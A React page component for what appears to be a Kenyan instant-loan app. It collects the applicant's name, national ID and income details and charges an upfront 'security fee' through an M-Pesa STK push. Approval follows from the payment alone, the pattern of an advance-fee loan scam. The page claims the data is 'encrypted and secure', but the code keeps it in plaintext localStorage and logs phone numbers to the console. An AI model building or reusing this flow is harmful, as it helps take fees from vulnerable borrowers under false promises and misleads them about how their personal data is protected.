import React, { useState, useEffect, useRef } from 'react';
import { useNavigate } from 'react-router-dom';
import toast, { Toaster } from 'react-hot-toast';

const SecureLoans = ({ onBack }) => {
  const navigate = useNavigate();
  
  const [isLoading, setIsLoading] = useState(true);
  const [userData, setUserData] = useState({});
  const [phoneNumber, setPhoneNumber] = useState('');
  const [loanTrackingId, setLoanTrackingId] = useState('');
  
  const [isPaying, setIsPaying] = useState(false);
  const [paymentStatus, setPaymentStatus] = useState(''); // 'success', 'failed', 'cancelled'
  const [clientReference, setClientReference] = useState('');
  const [payheroReference, setPayheroReference] = useState('');
  const [currentPollingStatus, setCurrentPollingStatus] = useState('');
  
  const intervalRef = useRef(null);

  // Load user data from localStorage on mount
  useEffect(() => {
    try {
      const storedString = localStorage.getItem('okoaChapaaUser');
      let stored = {};

      if (storedString) {
        stored = JSON.parse(storedString);
      }

      console.log('🔄 Loaded from localStorage:', stored);

      // Generate tracking ID if missing
      if (!stored.loanTrackingId) {
        const newId = 'OKC-' + Math.random().toString(36).substr(2, 9).toUpperCase();
        stored.loanTrackingId = newId;
        localStorage.setItem('okoaChapaaUser', JSON.stringify(stored));
        console.log('✅ Generated new Loan Tracking ID:', newId);
      }

      setUserData(stored);
      setLoanTrackingId(stored.loanTrackingId || '');
      setPhoneNumber(stored.mpesaPhone || '');

      // Check if we have essential data
      if (!stored.firstName && !stored.fullName) {
        console.warn('⚠️ No user data (firstName/fullName) found in localStorage');
      }
    } catch (error) {
      console.error('❌ Error loading from localStorage:', error);
      toast.error('Failed to load your data. Please try again.');
    } finally {
      setIsLoading(false);
    }
  }, []);

  // Continuous polling for payment status
  useEffect(() => {
    if (!payheroReference) return;

    if (intervalRef.current) clearInterval(intervalRef.current);

    intervalRef.current = setInterval(async () => {
      try {
        const res = await fetch(`/api/transaction-status?reference=${payheroReference}`);
        const data = await res.json();

        if (data.success && data.status) {
          const rawStatus = data.status.toUpperCase();
          setCurrentPollingStatus(rawStatus);

          console.log(
            `[${new Date().toISOString()}] Polling → ${rawStatus} | ` +
            `PayHero Ref: ${payheroReference} | Client Ref: ${clientReference} | ` +
            `Phone: 0${phoneNumber} | Amount: KES ${(userData.securityFee || userData.fee || 0).toLocaleString()}`
          );

          if (rawStatus === 'SUCCESS') {
            setPaymentStatus('success');
            clearInterval(intervalRef.current);

            const updatedUserData = {
              ...userData,
              approvalTime: Date.now(),
              paymentStatus: 'success',
            };

            localStorage.setItem('okoaChapaaUser', JSON.stringify(updatedUserData));
            setUserData(updatedUserData);

            toast.success('Payment Successful! Redirecting to approval...', {
              duration: 5000,
              icon: '🎉',
            });

            setTimeout(() => {
              navigate('/approved');
            }, 3000);
          } else if (rawStatus === 'FAILED') {
            setPaymentStatus('failed');
            toast.error('Payment failed. Please try again.', { duration: 8000 });
            clearInterval(intervalRef.current);
          } else if (rawStatus === 'CANCELLED') {
            setPaymentStatus('cancelled');
            toast('Payment was cancelled. You can try again.', { 
              icon: '⚠️', 
              duration: 8000 
            });
            clearInterval(intervalRef.current);
          }
        }
      } catch (err) {
        console.error('Polling error:', err);
      }
    }, 2000);

    return () => {
      if (intervalRef.current) clearInterval(intervalRef.current);
    };
  }, [payheroReference, clientReference, phoneNumber, userData, navigate]);

  const handlePaySecurityFee = async () => {
    if (phoneNumber.length !== 9 || isPaying || paymentStatus) return;

    setIsPaying(true);
    setCurrentPollingStatus('INITIATING');

    const clientRef = `app-${Date.now()}-${Math.random().toString(36).substr(2, 6).toUpperCase()}`;
    setClientReference(clientRef);

    try {
      const res = await fetch('/api/stk-push', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          phoneNumber: `0${phoneNumber}`,
          amount: userData.securityFee || userData.fee || 0,
          reference: clientRef,
        }),
      });

      const data = await res.json();

      if (data.success && data.payheroReference) {
        setPayheroReference(data.payheroReference);
        toast.success('STK Push sent! Check your phone to complete payment.', {
          icon: '📱',
          duration: 10000,
        });
      } else {
        throw new Error(data.error || 'Failed to get PayHero reference');
      }
    } catch (err) {
      toast.error('Failed to initiate payment. Please try again.');
      console.error('STK Push failed:', err);

      // Reset states on failure
      setIsPaying(false);
      setClientReference('');
      setPayheroReference('');
      setCurrentPollingStatus('');
    }
  };

  // Show loading screen
  if (isLoading) {
    return (
      <div className="text-center pt-28 text-lg">
        Loading your loan details...
      </div>
    );
  }

  // Show error/fallback if critical data is missing
  if (!userData.firstName && !userData.fullName) {
    return (
      <div className="text-center pt-28 px-6">
        <div className="max-w-md mx-auto bg-white rounded-3xl shadow-xl p-8">
          <i className="fas fa-exclamation-triangle text-6xl text-orange-500 mb-6"></i>
          <h2 className="text-2xl font-bold text-gray-800 mb-3">No Loan Details Found</h2>
          <p className="text-gray-600 mb-8">
            We couldn't find your loan application data. Please go back and complete the form again.
          </p>
          <button
            onClick={onBack}
            className="w-full py-4 bg-primary text-white font-semibold rounded-2xl hover:bg-primary/90 transition"
          >
            ← Go Back to Application
          </button>
        </div>
      </div>
    );
  }

  const securityFee = userData.securityFee || userData.fee || 0;

  const getDisplayStatus = () => {
    if (!payheroReference) return 'READY TO PAY';
    if (!currentPollingStatus) return 'WAITING FOR PAYMENT...';

    switch (currentPollingStatus) {
      case 'INITIATING': return 'SENDING REQUEST...';
      case 'QUEUED': return 'QUEUED – WAITING FOR M-PESA';
      case 'PENDING': return 'CHECK YOUR PHONE FOR PROMPT';
      case 'PROCESSING': return 'PROCESSING PAYMENT...';
      default: return currentPollingStatus;
    }
  };

  const isPollingActive = payheroReference && !paymentStatus;

  return (
    <>
      <Toaster
        position="top-center"
        reverseOrder={false}
        toastOptions={{
          duration: 6000,
          style: {
            background: '#333',
            color: '#fff',
            fontSize: '16px',
            borderRadius: '12px',
            padding: '16px 20px',
            maxWidth: '90vw',
          },
          success: { style: { background: '#10B981' } },
          error: { style: { background: '#EF4444' } },
        }}
      />

      <section className="pt-20 pb-20 min-h-screen bg-gradient-to-b from-background to-white">
        <div className="max-w-md mx-auto px-4">
          <button
            onClick={onBack}
            className="mb-6 text-primary hover:text-secondary font-medium flex items-center gap-2 text-base"
          >
            <i className="fas fa-arrow-left"></i> Back
          </button>

          <div className="bg-white rounded-3xl shadow-2xl p-6 sm:p-8">
            <div className="text-center mb-8">
              <i className="fas fa-shield-alt text-6xl sm:text-7xl text-secondary mb-4"></i>
              <h2 className="text-2xl sm:text-3xl font-bold text-primary mb-3">
                Secure Your Loan
              </h2>
              <p className="text-base sm:text-lg text-gray-700">
                Hello <strong>{userData.firstName || userData.fullName}</strong>,<br />
                complete the final step to receive your funds instantly.
              </p>
            </div>

            {/* User Info */}
            <div className="space-y-4 mb-10">
              <div className="bg-gray-50 rounded-2xl p-4">
                <p className="text-sm text-gray-600">Full Name</p>
                <p className="font-semibold text-lg">{userData.fullName || userData.firstName || '-'}</p>
              </div>
              <div className="bg-gray-50 rounded-2xl p-4">
                <p className="text-sm text-gray-600">National ID</p>
                <p className="font-semibold text-lg">{userData.idNumber || '-'}</p>
              </div>
              <div className="bg-gray-50 rounded-2xl p-4">
                <p className="text-sm text-gray-600">County</p>
                <p className="font-semibold text-lg">{userData.county || '-'}</p>
              </div>
              <div className="bg-gray-50 rounded-2xl p-4">
                <p className="text-sm text-gray-600">Monthly Income Range</p>
                <p className="font-semibold text-lg">{userData.monthlyIncomeRange || '-'}</p>
              </div>
              <div className="bg-gray-50 rounded-2xl p-4">
                <p className="text-sm text-gray-600">Loan Purpose</p>
                <p className="font-semibold text-lg">{userData.loanPurpose || '-'}</p>
              </div>
              <div className="bg-gray-50 rounded-2xl p-4">
                <p className="text-sm text-gray-600">Loan Amount</p>
                <p className="font-bold text-primary text-2xl">
                  KES {(userData.requestedAmount || userData.amount || 0).toLocaleString()}
                </p>
              </div>
              <div className="bg-gray-50 rounded-2xl p-4">
                <p className="text-sm text-gray-600">Security Fee</p>
                <p className="font-bold text-primary text-2xl">
                  KES {securityFee.toLocaleString()}
                </p>
              </div>
              <div className="bg-gradient-to-r from-secondary/20 to-primary/20 rounded-2xl p-5">
                <p className="text-sm text-gray-600">Total to Repay</p>
                <p className="font-bold text-primary text-3xl">
                  KES {(userData.totalRepay || 0).toLocaleString()}
                </p>
              </div>
              <div className="bg-gray-50 rounded-2xl p-4">
                <p className="text-sm text-gray-600">Repayment Period</p>
                <p className="font-semibold text-lg">60 days</p>
              </div>
              <div className="bg-secondary/10 rounded-2xl p-4">
                <p className="text-sm text-gray-600">Loan Tracking ID</p>
                <p className="font-mono font-bold text-secondary text-xl">{loanTrackingId}</p>
              </div>
            </div>

            {/* Payment Section */}
            <div className="bg-gradient-to-r from-secondary/10 to-primary/10 rounded-3xl p-6 text-center">
              <h3 className="text-xl sm:text-2xl font-bold text-primary mb-4">
                Pay Security Fee to Activate Loan
              </h3>
              <p className="text-base text-gray-700 mb-6">
                Enter your M-Pesa number and complete payment to receive your loan.
              </p>

              <div className="mb-8">
                <label className="block text-left text-base font-semibold text-gray-800 mb-2">
                  M-Pesa Phone Number
                </label>
                <div className="flex">
                  <span className="inline-flex items-center px-5 py-4 rounded-l-2xl border border-r-0 border-gray-300 bg-gray-50 text-gray-700 text-base font-medium">
                    +254
                  </span>
                  <input
                    type="tel"
                    value={phoneNumber}
                    onChange={(e) => setPhoneNumber(e.target.value.replace(/\D/g, '').slice(0, 9))}
                    maxLength="9"
                    disabled={isPaying || !!paymentStatus}
                    className="w-full px-5 py-4 text-base border border-gray-300 rounded-r-2xl focus:outline-none focus:ring-4 focus:ring-secondary/30 disabled:bg-gray-100"
                    placeholder="712345678"
                  />
                </div>
              </div>

              {/* Live Status */}
              {isPollingActive && (
                <div className="mb-6 p-5 bg-blue-50 border border-blue-200 rounded-2xl animate-pulse">
                  <p className="text-blue-900 flex items-center justify-center gap-3 text-lg font-medium">
                    <i className="fas fa-sync-alt fa-spin"></i>
                    {getDisplayStatus()}
                  </p>
                </div>
              )}

              {/* Terminal Status Messages */}
              {paymentStatus === 'success' && (
                <div className="mb-6 p-5 bg-green-50 border border-green-300 rounded-2xl">
                  <p className="text-green-800 font-bold text-center text-lg">
                    <i className="fas fa-check-circle mr-2"></i>
                    Payment Successful! Redirecting...
                  </p>
                </div>
              )}
              {paymentStatus === 'failed' && (
                <div className="mb-6 p-5 bg-red-50 border border-red-300 rounded-2xl">
                  <p className="text-red-800 font-bold text-center text-lg">
                    <i className="fas fa-times-circle mr-2"></i>
                    Payment Failed – Please try again
                  </p>
                </div>
              )}
              {paymentStatus === 'cancelled' && (
                <div className="mb-6 p-5 bg-orange-50 border border-orange-300 rounded-2xl">
                  <p className="text-orange-800 font-bold text-center text-lg">
                    <i className="fas fa-exclamation-triangle mr-2"></i>
                    Payment Cancelled – You can retry
                  </p>
                </div>
              )}

              <button
                onClick={handlePaySecurityFee}
                disabled={phoneNumber.length !== 9 || isPaying || !!paymentStatus}
                className="w-full btn-primary text-lg py-5 rounded-2xl font-bold shadow-lg hover:shadow-xl disabled:opacity-60 disabled:cursor-not-allowed transition"
              >
                {isPaying ? (
                  <>
                    <i className="fas fa-spinner fa-spin mr-3"></i>
                    Sending STK Push...
                  </>
                ) : paymentStatus === 'success' ? (
                  'Processing Approval...'
                ) : paymentStatus ? (
                  'Try Payment Again'
                ) : (
                  `Pay KES ${securityFee.toLocaleString()} Security Fee`
                )}
              </button>

              <p className="text-xs sm:text-sm text-gray-600 mt-5">
                You will receive an M-Pesa prompt to pay KES {securityFee.toLocaleString()}.<br />
                Once paid, your loan will be approved instantly.
              </p>
            </div>

            {/* Reassurance */}
            <div className="mt-10 space-y-4 text-center">
              <p className="text-gray-700 flex items-center justify-center gap-3">
                <i className="fas fa-lock text-secondary text-xl"></i>
                <span className="text-base">Your data is encrypted and secure</span>
              </p>
              <p className="text-gray-700 flex items-center justify-center gap-3">
                <i className="fas fa-headset text-secondary text-xl"></i>
                <span className="text-base">Support available 24/7</span>
              </p>
            </div>
          </div>
        </div>
      </section>
    </>
  );
};

export default SecureLoans;